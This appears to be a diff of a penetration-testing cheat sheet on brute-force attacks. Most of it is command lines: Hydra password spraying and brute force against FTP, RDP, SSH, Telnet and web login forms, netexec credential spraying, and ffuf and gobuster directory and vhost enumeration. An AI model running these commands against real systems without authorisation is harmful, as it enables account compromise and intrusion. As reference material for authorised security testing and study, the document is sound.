@@ -1,60 +1,53 @@
+# Bruteforce Attacks
 
-Spray to test passwords
+## Hydra
 ```bash
-hydra -L users.txt -p 'Spring2026!' -t 4 -W 3 -o spray_pass1.txt ftp://$ip
+hydra -l jason -P passwords.txt -t 4 -W 3 -o of.txt ftp://$ip
 ```
-f to exit on hit
+With HTTP you will need to get an indicated for a failed sign-in attempt where "Login failed." is
 ```bash
-hydra -L users.txt -p pass.txt -f -t 4 -W 3 -o spray_pass1.txt ftp://$ip
+hydra -L users.txt -P passwords.txt 192.168.0.25 http-post-form "/index.php:usr=^USER^&fm_pwd=^PASS^:Login failed. Wrong Use"
 ```
-
-Null/same-as-user/reversed logins (cheap first pass)
 ```bash
-hydra -L users.txt -P pass.txt -e nsr -t 4 ftp://$ip
+-l      # Single user
+-p      # Single password
+-L      # User file
+-P      # Password file
+-t      # Number of parallel tasks (default 16)
+-o      # outfile
+-W      # wait time for response
+-s      # select non-standard port
+-e nsr  #  try "n" null password, "s" login as pass and/or "r" reversed login
 ```
-
-RDP is slow to spray — prefer SMB/WinRM for cred validation, then use found creds here.
-Spray with netexec (lightweight check)
-```bash
-nxc rdp $ip -u users.txt -p 'Spring2026!' --continue-on-success
-```
-Brute force with hydra
-```bash
-hydra -L users.txt -P pass.txt rdp://$ip
-```
-
-SSH brute is slow and noisy — spray only, and only after other methods fail.
-Spray a single password across users
-```bash
-hydra -L users.txt -p 'Spring2026!' -t 4 ssh://$ip
-```
-Brute force with a password list
-```bash
-hydra -L users.txt -P pass.txt -t 4 ssh://$ip
+Hydra Supports over 50 protocols including:
+```text
+smtp, pop3, imap
+ftp, sftp, tftp
+ssh, telnet, rdp
+mssql, mysql
+http, https
 ```
 
-Telnet
-Brute force with hydra
+## nxc
+nxc also contains support or several protocols, including smb, rdp and ldap
 ```bash
-hydra -L users.txt -P pass.txt telnet://$ip
+nxc smb $ip -u users.txt -p passwords.txt --continue-on-success
 ```
 
-http
-App-level brute force is common but slow. Spray before brute, and always check for rate limiting.
-Spray a single password across users (POST form)
-```bash
-hydra -L users.txt -p 'Spring2026!' $ip http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid" -t 4
-```
-Brute force with a password list (POST form)
-```bash
-hydra -L users.txt -P pass.txt $ip http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid" -t 4
-```
-Directory/file brute with ffuf (fastest)
+## directory bruteforcing
+
+ffuf
 ```bash
 ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.bak,.old -mc 200,301,302,403
 ```
-Directory/file brute with gobuster
+gobuster
 ```bash
 gobuster dir -u http://$ip -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,old -t 40
 ```
+gobuster can also be used for protocols such as ftp
+```bash
 gobuster dir -u ftp://$ip -w pslist.txt
+```
+additionally, gobuster can be used for dns, tftp, vhosts, and more
+```bash
+gobuster vhost -u http://$ip -w wl.txt
